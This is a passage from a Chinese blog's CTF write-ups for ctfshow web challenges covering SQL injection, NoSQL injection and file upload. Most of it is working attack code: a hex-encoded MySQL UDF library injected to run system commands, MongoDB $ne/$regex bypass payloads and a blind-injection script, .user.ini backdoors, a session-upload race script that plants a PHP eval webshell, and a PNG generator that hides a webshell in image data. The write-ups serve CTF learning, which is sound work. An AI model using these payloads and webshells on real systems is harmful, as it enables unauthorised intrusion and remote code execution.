04883C9FF4889D7F2AE48F7D148FFC948894D00595B4889D05DC39090909090909090554889E5534883EC08488B05C80320004883F8FF7419488D1DBB0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E86FFBFFFF4883C408C345787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D657465720045787065637465642065786163746C792074776F20617267756D656E747300457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E34004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F290000011B033B980000001200000040FBFFFFB400000041FBFFFFCC00000042FBFFFFE400000043FBFFFFFC00000044FBFFFF1401000047FBFFFF2C01000048FBFFFF44010000E2FBFFFF6C010000CAFCFFFFA4010000F3FCFFFFBC0100001CFDFFFFD401000086FDFFFFF4010000B6FDFFFF0C020000E3FDFFFF2C02000002FEFFFF4402000016FEFFFF5C02000084FEFFFF7402000093FEFFFF8C0200001400000000000000017A5200017810011B0C070890010000140000001C00000084FAFFFF01000000000000000000000014000000340000006DFAFFFF010000000000000000000000140000004C00000056FAFFFF01000000000000000000000014000000640000003FFAFFFF010000000000000000000000140000007C00000028FAFFFF030000000000000000000000140000009400000013FAFFFF01000000000000000000000024000000AC000000FCF9FFFF9A00000000420E108C02480E18410E20440E3083048603000000000034000000D40000006EFAFFFFE800000000420E10470E18420E208D048E038F02450E28410E30410E38830786068C05470E50000000000000140000000C0100001EFBFFFF2900000000440E100000000014000000240100002FFBFFFF2900000000440E10000000001C0000003C01000040FBFFFF6A00000000410E108602440E188303470E200000140000005C0100008AFBFFFF3000000000440E10000000001C00000074010000A2FBFFFF2D00000000420E108C024E0E188303470E2000001400000094010000AFFBFFFF1F00000000440E100000000014000000AC010000B6FBFFFF1400000000440E100000000014000000C4010000B2FBFFFF6E00000000440E300000000014000000DC01000008FCFFFF0F00000000000000000000001C000000F4010000FFFBFFFF4100000000410E108602440E188303470E2000000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF000000000000000000000000000000000100000000000000B2010000000000000C00000000000000A00B0000000000000D00000000000000781100000000000004000000000000005801000000000000F5FEFF6F00000000A00200000000000005000000000000006807000000000000060000000000000060030000000000000A00000000000000E0010000000000000B0000000000000018000000000000000300000000000000E81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200A0000000000000700000000000000C0090000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000A009000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000004809000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000CE0B000000000000DE0B000000000000EE0B000000000000FE0B0000000000000E0C0000000000001E0C0000000000002E0C0000000000003E0C0000000000004E0C0000000000005E0C0000000000006E0C0000000000007E0C0000000000008E0C0000000000009E0C000000000000AE0C000000000000BE0C0000000000008017200000000000004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200002E7368737472746162002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E64796E616D6963002E676F74002E676F742E706C74002E64617461002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000B000000F6FFFF6F0200000000000000A002000000000000A002000000000000C000000000000000030000000000000008000000000000000000000000000000150000000B00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001D00000003000000020000000000000068070000000000006807000000000000E00100000000000000000000000000000100000000000000000000000000000025000000FFFFFF6F020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000FEFFFF6F0200000000000000A009000000000000A009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000C009000000000000C00900000000000060000000000000000300000000000000080000000000000018000000000000004B000000040000000200000000000000200A000000000000200A0000000000008001000000000000030000000A0000000800000000000000180000000000000055000000010000000600000000000000A00B000000000000A00B000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000B80B000000000000B80B00000000000010010000000000000000000000000000040000000000000010000000000000005B000000010000000600000000000000D00C000000000000D00C000000000000A80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000E000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000DD000000000000000000000000000000010000000000000001000000000000006F000000010000000200000000000000641200000000000064120000000000009C000000000000000000000000000000040000000000000000000000000000007D000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008E000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009A000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000A3000000010000000300000000000000D016200000000000D0160000000000001800000000000000000000000000000008000000000000000800000000000000A8000000010000000300000000000000E816200000000000E8160000000000009800000000000000000000000000000008000000000000000800000000000000B1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000B7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000BC000000010000000000000000000000000000000000000088170000000000009B000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000C500000000000000000000000000000001000000000000000000000000000000"</span></span><br><span class="line">udf_text=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20000</span>,<span class="number">5000</span>):</span><br><span class="line">    end = i+<span class="number">5000</span></span><br><span class="line">    udf_text.append(udf[i:end])</span><br><span class="line"></span><br><span class="line">p = dict(zip(text,udf_text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> text:</span><br><span class="line">    param=payload.format(p[t],t)</span><br><span class="line">    get_url = url + param</span><br><span class="line">    res = requests.get(get_url)</span><br><span class="line">    print(<span class="string">"[*]"</span>,end=<span class="string">""</span>)</span><br><span class="line">    code = res.status_code</span><br><span class="line">    print(code,end=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span>  code==<span class="number">404</span>:</span><br><span class="line">        print(<span class="string">"你输入的URL可能出错"</span>)</span><br><span class="line">    acq=acquire.format(t)</span><br><span class="line">    data=url+acq</span><br><span class="line">    res = requests.get(url=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"load_file"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">"--&gt;成功插入&#123;&#125;.txt"</span>.format(t))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*]导入udf.so成功"</span>)</span><br><span class="line">url_sys_dll = <span class="string">"?id=1%27;select unhex(concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'))) into dumpfile '/usr/lib/mariadb/plugin/udf.so' --+"</span></span><br><span class="line">res= requests.get(url=url+url_sys_dll)</span><br><span class="line">print(<span class="string">"[*]创建函数sys_eval()成功"</span>)</span><br><span class="line">url_sys_function = <span class="string">"?id=1%27;create function sys_eval returns string soname 'udf.so'--+"</span></span><br><span class="line">res= requests.get(url=url+url_sys_function)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*]命令执行结果: "</span>)</span><br><span class="line">sys_eval=<span class="string">"?id=';select sys_eval('cat /flag.*')--+"</span></span><br><span class="line">res= requests.get(url=url+sys_eval)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803114942859.png" alt="image-20210803114942859"></p>
<h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><blockquote>
<ul>
<li>nosql,也跟MongoDB一个意思，先去补补MongoDB的基础知识，<a href="https://gylq.gitee.io/2021/08/04/%E3%80%90MongoDB%E3%80%91%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/">MongoDB基础</a></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;无</span><br><span class="line">$user &#x3D; $memcache-&gt;get($id);</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210804163303545.png" alt="image-20210804163303545"></p>
<blockquote>
<p>由于他校验的是第一个输入的数据，对于非空的数组，intval会返回1，所以可以绕过intval校验，然后再来搜flag，就可以搜索key为flag的值了</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">?id[]&#x3D;flag</span><br></pre></td></tr></table></figure></div>

<h2 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">  $query &#x3D; new MongoDB\Driver\Query($data);</span><br><span class="line">  $cursor &#x3D; $manager-&gt;executeQuery(&#39;ctfshow.ctfshow_user&#39;, $query)-&gt;toArray();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;无过滤</span><br><span class="line">  if(count($cursor)&gt;0)&#123;</span><br><span class="line">    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;</span><br><span class="line">    array_push($ret[&#39;data&#39;], $flag);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>他传入的data是username和password，所以想要这个返回值为真，我们就要构造永真式，利用ne（not equal）来让这个式子一直是真的，就为1就绕过了</p>
</blockquote>
<p><strong>post传入payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">username[$ne]&#x3D;hacker&amp;password[$ne]&#x3D;hacker</span><br></pre></td></tr></table></figure></div>

<h2 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h2><blockquote>
<ul>
<li>感觉和上题一样，那就换个永真式</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">username[$regex]&#x3D;.*&amp;password[$regex]&#x3D;.*</span><br></pre></td></tr></table></figure></div>

<h2 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h2><blockquote>
<ul>
<li>这题和上题有点区别，利用永真式获得了账号和密码，登陆并没有获取flag，用正则找一下</li>
</ul>
</blockquote>
<p>payload，找以f开头的用户名就找到了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">username[$regex]&#x3D;f.*&amp;password[$ne]&#x3D;1</span><br></pre></td></tr></table></figure></div>

<h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2><blockquote>
<ul>
<li>这题跟上面几题有点不同，可以登录成功，但是无回显。所以我们可以通过正则匹配来判断这个是否存在。</li>
</ul>
</blockquote>
<p>明显，账号数据中存在flag，因为显示的msg是登录成功<img src="https://gylq.gitee.io/cloudimages/img/image-20210804144108579.png" alt="image-20210804144108579"></p>
<p>因此我们利用这个回显，写个布尔盲注脚本</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/4</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://a2efa0f0-f634-4621-bd4a-e96a4f1b0196.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">payload_user = <span class="string">"flag.*"</span></span><br><span class="line">payload_pass = <span class="string">"^&#123;&#125;.*"</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username[$regex]'</span>:payload_user,</span><br><span class="line">            <span class="string">'password[$regex]'</span>:payload_pass.format(flag+j)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r"\u767b\u9646\u6210\u529f"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210804162826968.png" alt="image-20210804162826968"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web篇-文件上传 wp</title>
    <url>/posts/97.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>记录web的题目wp，慢慢变强，铸剑。</p>
</blockquote>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><blockquote>
<ul>
<li>直接抓包改后缀名</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210721183539568.png" alt="image-20210721183539568"></p>
<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210721183539568.png" alt=""></p>
<h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><ul>
<li><strong>对php后缀基本都限制了，我们构造.user.ini用户后门</strong></li>
</ul>
<blockquote>
<ul>
<li><strong>php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file&#x3D;filename      &#x2F;&#x2F;包含在文件头</span><br><span class="line">auto_append_file&#x3D;filename       &#x2F;&#x2F;包含在文件尾</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>auto_prepend_file=1.png 就相当于当前目录中所有的php文件都调用了require(‘1.png’),只要进入任意一个php文件就可以使用1.png中我们构造的一句话木马来直接getshell和命令执行。</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>首先上传.user.ini文件</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723154700946.png" alt="image-20210723154700946"></p>
</blockquote>
<ul>
<li><strong>再直接上传01.png</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723154751780.png" alt="image-20210723154751780"></p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723155013717.png" alt="image-20210723155013717"></p>
<blockquote>
<ul>
<li>直接拿flag</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723155132721.png" alt="image-20210723155132721"></p>
<h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><blockquote>
<ul>
<li><strong>和上题一样传了个.user.ini文件进去，结果一句话木马写不进去，改用短标签代码&lt;?=就相当于echo接着双反引号执行命令要记得闭合</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723160015412.png" alt="image-20210723160015412"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723160118025.png" alt="image-20210723160118025"></p>
<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723160315690.png" alt="image-20210723160315690"></p>
<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><blockquote>
<ul>
<li>和上题一样就是分号过滤了，分号改成?&gt;</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723161141006.png" alt="image-20210723161141006"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723161148481.png" alt="image-20210723161148481"></p>
<h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><blockquote>
<ul>
<li>过滤了反引号，那就文件包含，因为php被过滤了所以得用.来绕过</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?&#x3D;include&quot;ph&quot;.&quot;p:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;flag.ph&quot;.&quot;p&quot;?&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723162541778.png" alt="image-20210723162541778"></p>
<h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><blockquote>
<ul>
<li>连普通的图片的上传上去，查了下</li>
<li><strong>getimagesize():</strong> 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</li>
<li>所以在上题的基础上都加个<strong>GIF89a</strong>图片头就可以了</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723163145783.png" alt="image-20210723163145783"></p>
<h2 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h2><blockquote>
<ul>
<li><strong>session文件包含原理，和web82相同，还是先上传.user.ini，过gif图片头加一个GIF89A</strong></li>
<li>参考 <a href="http://www.xl-bit.cn/index.php/archives/90/" target="_blank" rel="noopener">bit</a>、<a href="https://blog.csdn.net/miuzzx/article/details/109537262" target="_blank" rel="noopener">yu22x</a>、<a href="https://www.wlhhlc.top/posts/14827/#web162" target="_blank" rel="noopener">dota_st</a></li>
</ul>
</blockquote>
<ul>
<li><strong>.user.ini</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">GIF89A</span><br><span class="line">auto_prepend_file&#x3D;&#x2F;tmp&#x2F;sess_test</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>exp162.py</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># # -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># # Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># # Date:2021/8/16</span></span><br><span class="line"><span class="comment"># # blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://3d100d08-e9cb-4652-8900-20f40eb2f857.challenge.ctf.show:8080/'</span></span><br><span class="line">sessionid = <span class="string">"gylq"</span></span><br><span class="line">payload = <span class="string">"&lt;?php file_put_contents('shell.php','&lt;?php eval($_REQUEST[1]);?&gt;');?&gt;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        url_include=url+<span class="string">'upload/index.php'</span></span><br><span class="line">        res = requests.post(url_include)</span><br><span class="line">        <span class="keyword">if</span> sessionid <span class="keyword">in</span> res.text:</span><br><span class="line">            print(session.post(url+<span class="string">"upload/"</span>+<span class="string">"shell.php?1=system('cat ../flag.php');"</span>).text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[*]retry'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: payload+sessionid</span><br><span class="line">        &#125;</span><br><span class="line">        cookies = &#123;</span><br><span class="line">            <span class="string">'PHPSESSID'</span>: sessionid</span><br><span class="line">        &#125;</span><br><span class="line">        files = &#123;</span><br><span class="line">            <span class="string">'file'</span>: (<span class="string">'gylq.txt'</span>,io.BytesIO(<span class="string">b'success'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        res = session.post(url=url,data=data,cookies=cookies,files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    event=threading.Event()</span><br><span class="line">    event.set()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>): <span class="comment"># 30是比较快的，关线程也很慢，所以建议为1一样可行，如果一直未出结果，可以调高线程</span></span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>): <span class="comment"># 30是比较快的，关线程也很慢，所以建议为1一样可行，如果一直未出结果，可以调高线程</span></span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>运行结果</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724104738490.png" alt="image-20210724104738490"></p>
<h2 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h2><blockquote>
<ul>
<li>和上题一模一样</li>
</ul>
</blockquote>
<h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2><blockquote>
<ul>
<li>题目说改头换面，猜测可能是二次渲染，大家可以参考<a href="https://www.sqlsec.com/2020/10/upload.html#toc-heading-21" target="_blank" rel="noopener">国光师傅</a></li>
<li>直接用外国大佬脚本生成一个</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*&lt;?$_GET[0]($_POST[1]);?&gt;*/</span></span><br><span class="line"></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">    <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">    $r = $p[$y];</span><br><span class="line">    $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">    $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">    $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">    imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">'1.png'</span>);</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724105501375.png" alt="image-20210724105501375"></p>
<ul>
<li><strong>打开看看是否成功写入</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_GET[<span class="number">0</span>]($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724105536362.png" alt="image-20210724105536362"></p>
<blockquote>
<ul>
<li><strong>直接上传，抓包，改post传参然后getflag</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724105922637.png" alt="image-20210724105922637"></p>
<h2 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h2><blockquote>
<ul>
<li><strong>这次变成jpg二次渲染，网上找大佬代码</strong></li>
</ul>
</blockquote>
